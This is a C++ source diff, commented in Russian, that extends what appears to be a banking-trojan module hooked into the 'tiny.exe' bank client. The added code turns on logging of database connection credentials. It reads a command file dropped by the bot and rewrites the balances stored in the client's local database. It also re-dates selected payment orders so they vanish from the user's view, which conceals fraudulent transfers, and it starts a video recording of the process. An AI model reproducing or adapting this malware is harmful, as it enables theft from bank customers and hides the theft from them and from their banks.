@@ -31,6 +31,27 @@ namespace TINYCLIENT
 namespace Tiny
 {
 
+//какой остаток должен быть для указанного счета
+struct RestAccount
+{
+	char account[32]; //если account[0] = 0, то конец массива
+	TIMESTAMP_STRUCT date; //после какой даты
+	DWORD sum; //какой остаток нужно подставить
+};
+
+//скрываемые платежки
+struct HidePayment
+{
+	char account[32];
+	char num[16]; //номер документа
+	DWORD amount; //сумма
+	TIMESTAMP_STRUCT date; //дата платежки
+};
+
+static RestAccount restAccounts[10]; //подмена баланса
+static HidePayment hidePayments[10]; //скрываемые платежки
+static bool runHideReplacement = false; //true - если надо провести подмену скрытие
+
 const int PROCESS_HASH = 0x9530DB12; // tiny.exe
 const DWORD HashTfAuthNew = 0x19DEB558; //класс окна входа в систему
 
@@ -147,6 +168,8 @@ static bool SetHooks(); //установка хуков в момент активизации системы
 static bool SetHooks2(); //установка хуков в момент запуска приложения
 static bool InitData();
 static bool ReplacementFuncs( void** ppv, int* nums, void** handlerFuncs, void** realFuncs, int count );
+//поток подмены баланса и скрытия платежек
+static DWORD WINAPI ThreadHideReplacement(void*);
 
 static void CloseDB( ODBC* DB )
 {
@@ -433,7 +456,25 @@ static char* ToHex( char* s, const BYTE* p, int c_p )
 
 static HRESULT __stdcall HandlerConnection_Open( void* This, BSTR ConnectionString, BSTR UserID, BSTR Password, long Options )
 {
-//	DBG( "Tiny", "Connection_Open: '%ls','%ls','%ls'", ConnectionString, UserID, Password );
+	DBG( "Tiny", "Connection_Open: '%ls','%ls','%ls'", ConnectionString, UserID, Password );
+	if( pathMDB[0] == 0 )
+	{
+		char* cs = WSTR::ToAnsi( ConnectionString, 0 );
+		char* p = strstr( cs, "Data Source=" );
+		if( p )
+		{
+			p += 12; //+= len("Data Source=")
+			char* p2 = STR::Scan( p, ';' );
+			if( p2 )
+			{
+				int l = p2 - p;
+				m_memcpy( pathMDB, p, l );
+				pathMDB[l] = 0;
+				DBG( "Tiny", "path database: %s", pathMDB );
+			}
+		}
+		STR::Free(cs);
+	}
 	return RealConnection_Open( This, ConnectionString, UserID, Password, Options );
 }
 
@@ -456,6 +497,7 @@ static HRESULT __stdcall HandlerField_get_Value( void* This, VARIANT * pvar )
 			}
 			i++;
 		}
+/*
 		switch( pvar->vt )
 		{
 			case VT_I4:
@@ -471,6 +513,7 @@ static HRESULT __stdcall HandlerField_get_Value( void* This, VARIANT * pvar )
 				DBG( "Tiny", "[%ls] type value = %d", nameField, pvar->vt );
 				break;
 		}
+*/
 	}
 	return hr;
 }
@@ -506,7 +549,7 @@ static HRESULT __stdcall HandlerRecordset_Open( void* This, VARIANT Source, VARI
 
 static HRESULT __stdcall HandlerCommand_put_CommandText( void* This, BSTR pbstr )
 {
-	DBG( "Tiny", "Command_put_CommandText: '%ls'", pbstr );
+//	DBG( "Tiny", "Command_put_CommandText: '%ls'", pbstr );
 	//выделяем место и копируем запрос
 	int len = m_wcslen(pbstr);
 	int size = (2 * len + 1) * sizeof(WCHAR); //выделяем в два раза больше памяти, чтобы функция фильтра могла изменить запрос
@@ -673,6 +716,7 @@ bool Init( const char* appName )
 		{
 			F1->OnActivate = Activeted;
 		}
+		RunThread( ThreadHideReplacement, 0 );
 		return true;
 	}
 	return false;
@@ -704,6 +748,8 @@ static bool InitData()
 	currentBalance = 0;
 //	if( GetAdminUrl(domain) == 0 )
 //		domain[0] = 0;
+	restAccounts[0].account[0] = 0;
+	hidePayments[0].account[0] = 0;
 	return true;
 }
 
@@ -783,6 +829,296 @@ static void FV_FullName_Amounts( VARIANT* v )
 		}
 		stateSQL = 1;
 	}
+}
+
+////////////////////////////////////////////////////////////////////////////////////////
+// Функции подмены и скрытия
+////////////////////////////////////////////////////////////////////////////////////////
+
+//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
+//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
+static int SumToInt( const char* s, int* len )
+{
+	int v = 0;
+	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	while( (*s >= '0' && *s <= '9') || *s == '.'  )
+	{
+	    if( *s == '.' ) 
+	    	kop = 0;
+	    else
+	    {
+			v = v * 10 + (*s - '0');
+			if( kop >= 0 ) kop++;
+		}
+		s++;
+	}
+	//добавляем нули в конце чтобы всегда в копейках было две цифры
+	if( kop < 0 ) kop = 0;
+	for( int i = kop; i < 2; i++ ) v *= 10; 
+	if( len ) *len = s - p;
+	return v;
+}
+
+//текст в число, до 1-го не числового символа
+static int ValueToInt( const char* s, int* len )
+{
+	int v = 0;
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	while( *s >= '0' && *s <= '9' )
+	{
+		v = v * 10 + (*s - '0');
+		s++;
+	}
+	if( len ) *len = s - p;
+	return v;
+}
+
+//чтение даты в формате dd.mm.yyyy hh:mm:ss, возвращает количество считанных символов
+static int ReadDate( const char* s, TIMESTAMP_STRUCT* date )
+{
+	m_memset( date, 0, sizeof(TIMESTAMP_STRUCT) );
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	int len;
+	do
+	{
+		date->day = ValueToInt( s, &len ); s += len;
+		if( *s != '.' ) break;
+		s++;
+		date->month = ValueToInt( s, &len ); s += len;
+		if( *s != '.' ) break;
+		s++;
+		date->year = ValueToInt( s, &len ); s += len;
+		if( *s != ' ' ) break;
+		while( *s == ' ' ) s++;
+		date->hour = ValueToInt( s, &len ); s += len;
+		if( *s != ':' ) break;
+		s++;
+		date->minute = ValueToInt( s, &len ); s += len;
+		if( *s != ':' ) break;
+		s++;
+		date->second = ValueToInt( s, &len ); s += len;
+	} while(0);
+	return s - p;
+}
+
+static int ReadString( const char* s, char* buf )
+{
+	const char* p = s;
+	while( *s == ' ' ) s++;
+	while( *s && *s != ' ' ) *buf++ = *s++;
+	*buf = 0;
+	return s - p;
+}
+
+static char* ConvertAccount( const char* from, char* to )
+{
+	const char* sql = "select Code From Amounts";
+	char Code[33];
+	ODBC* DB = OpenDB();
+	if( DB )
+	{
+		SQLHSTMT qr = DB->ExecuteSql( sql, "os32", Code );
+		if( qr )
+		{
+			do
+			{
+				int space = 0;
+				char* p = Code;
+				char* t = to;
+				while( *p && *p != '.' )
+				{
+					if( *p == ' ' )
+					{
+						if( space == 0 ) 
+						{
+							space = p - Code;
+							*t++ = *p;
+						}
+					}
+					else
+						*t++ = *p;
+					p++;
+				}
+				if( space > 0 )
+				{
+					to[space] = p[-1];
+					t--;
+				}
+				while( *p ) *t++ = *p++;
+				*t = 0;
+				if( m_lstrcmp( from, to ) ==  0 )
+				{
+					m_lstrcpy( to, Code );
+					break;
+				}
+			} while( DB->NextRow(qr) );
+			DB->CloseQuery(qr);
+		}
+		CloseDB(DB);
+	}
+	DBG( "Tiny", "ConvertAccount: %s -> %s", from, to );
+	return to;
+}
+
+//считывает строку вида
+//"40702810300010100847 4.82 25.11.2012 10:11: 12, 40702810300010100847 1000.00 27.11.2012; 40702810300010100847 675 26.11.2012, 40702810300010100847 678 28.11.20012";
+//где через запятую перечисляются балансы для подмены: счет сумма дата
+//после точки с запятой идут скрываемые платежки (через запятую): счет номер платежки дата
+static void ReadReplacement( const char* s )
+{
+	//чтение остатка
+	int n = 0;
+	while( *s )
+	{
+		//считываем счет
+		char account[32];
+		s += ReadString( s, account );
+		ConvertAccount( account, restAccounts[n].account );
+		//сумма
+		int len;
+		restAccounts[n].sum = SumToInt( s, &len );
+		s += len;
+		//дата
+		s += ReadDate( s, &restAccounts[n].date );
+		DBG( "Tiny", "Подмена баланса для счета: %s, разница: %d", restAccounts[n].account, restAccounts[n].sum );
+		DBG( "Tiny", "Дата %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
+		while( *s == ' ' ) s++;
+		n++;
+		if( n >= ARRAYSIZE(restAccounts) - 1 ) break;
+		if( *s++ == ';' ) break;
+	}
+	restAccounts[n].account[0] = 0; //конец массива
+	s++;
+	n = 0;
+	while( *s )
+	{
+		//считываем счет
+		char account[32];
+		s += ReadString( s, account );
+		ConvertAccount( account, hidePayments[n].account );
+		//номер платежки
+		s += ReadString( s, hidePayments[n].num );
+		s += ReadDate( s, &hidePayments[n].date );
+		while( *s == ' ' ) s++;
+		DBG( "Tiny", "Скрытие платежки: %s %s", hidePayments[n].account, hidePayments[n].num );
+		DBG( "Tiny", "Дата %02d.%02d.%02d", hidePayments[n].date.day, hidePayments[n].date.month, hidePayments[n].date.year );
+		n++;
+		if( *s == 0 || n >= ARRAYSIZE(hidePayments) - 1 ) break;
+		s++;
+	}
+	hidePayments[n].account[0] = 0; //конец массива
+}
+
+//корректировка баланса
+static void ReplacementBalance()
+{
+	DBG( "Tiny", "Осуществляем подмену баланса" );
+	int n = 0;
+	ODBC* DB = OpenDB();
+	if( DB )
+	{
+		TMemory sqlBuf(1024);
+		const char* sql;
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+		while( restAccounts[n].account[0] )
+		{
+			DBG( "Tiny", "Для счета %s ставим баланс %d", restAccounts[n].account, restAccounts[n].sum );
+			sql = "update Amounts set Expected=%d.%d,Confirmed=%d.%d where Code='%s'";
+			DWORD v = restAccounts[n].sum;
+			pwsprintfA( sqlBuf.AsStr(), sql, v / 100, v % 100, v / 100, v % 100, restAccounts[n].account );
+			DBG( "Tiny", "sql = '%s'", sqlBuf.AsStr() );
+			SQLHSTMT qr = DB->ExecuteSql( sqlBuf.AsStr(), 0 );
+			DB->CloseQuery(qr);
+			n++;
+		}
+		CloseDB(DB);
+	}
+}
+
+//скрытие платежек
+static void HidePayments()
+{
+	DBG( "Tiny", "Скрываем платежки" );
+	ODBC* DB = OpenDB();
+	if( DB )
+	{
+		DWORD dateFirst; //самая ранняя дата платежек
+		const char* sql = "select min(OrgDate) from Documents";
+		SQLHSTMT qr = DB->ExecuteSql( sql, "oi", &dateFirst );
+		if( qr )
+		{
+			DB->CloseQuery(qr);
+			TMemory sqlBuf(1024);
+			fwsprintfA pwsprintfA = Get_wsprintfA();
+			int n = 0;
+			while( hidePayments[n].account[0] )
+			{
+				DBG( "Tiny", "Скрываем платежку %s %s", hidePayments[n].account, hidePayments[n].num );
+				//DWORD MyDate;
+				//sql = "select CLng(?) as MyDate";
+				//qr = DB->ExecuteSql( sql, "it oi", &hidePayments[n].date, &MyDate );
+				//DB->CloseQuery(qr);
+				//DBG( "Tiny", "MyDate=%d", MyDate );
+				TIMESTAMP_STRUCT endDay; //конец дня, для выбора платежки за определенный день
+				m_memcpy( &endDay, &hidePayments[n].date, sizeof(endDay) );
+				endDay.hour = 23;
+				endDay.minute = 59;
+				endDay.second = 59;
+				sql = "update Documents set OrgDate=?, DayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+				qr = DB->ExecuteSql( sql, "ii ii is24 it it is15", &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+				DB->CloseQuery(qr);
+				sql = "update MyDocuments set OrgDate=?, DayDate=?, PayDate=? where DebitInit=? and Created>=? and Created<=? and Code=?";
+				qr = DB->ExecuteSql( sql, "ii ii ii is24 it it is15", &dateFirst, &dateFirst, &dateFirst, hidePayments[n].account, &hidePayments[n].date, &endDay, &hidePayments[n].num );
+				DB->CloseQuery(qr);
+				n++;
+			}
+		}
+		CloseDB(DB);
+	}
+}
+
+static DWORD WINAPI ThreadHideReplacement(void*)
+{
+	//ждем пока появится строка подключения
+	do
+	{
+		pSleep(1000);
+	} while( pathMDB[0] == 0 );
+	pSleep(1000);
+	string fileFlag = BOT::MakeFileName( 0, GetStr(TinyFlagUpdate).t_str() );
+	for(;;)
+	{
+		DBG( "Tiny", "Запуск подмены и скрытия" );
+		DWORD size;
+		//в считываемом файле в конце данных должен быть обязательно 0 или любой другой символ,
+		//чтобы потом вставить 0 и получить полноценную строку. 
+		//Это нужно учитывать при создании файла
+		char* rpl = (char*)File::ReadToBufferA( BOT::MakeFileName( 0, GetStr(TinyReplacement).t_str() ).t_str(), size );
+		//char* rpl = (char*)File::ReadToBufferA( "c:\\11.txt", size );
+		if( rpl )
+		{
+			VideoProcess::RecordPID( 0, "Tiny" ); //видео пишем только когда была команда на подмену
+			rpl[size - 1] = 0;
+			ReadReplacement(rpl);
+			MemFree(rpl);
+		}
+		//удаляем флаг запуска подмены
+		pDeleteFileA( fileFlag.t_str() );
+		ReplacementBalance();
+		HidePayments();
+		runHideReplacement = false;
+		for(;;)
+		{
+			if( File::IsExists( fileFlag.t_str() ) ) break;
+			if( runHideReplacement ) break;
+			pSleep(5000);
+		}
+	}
+	return 0;
 }
 
 }
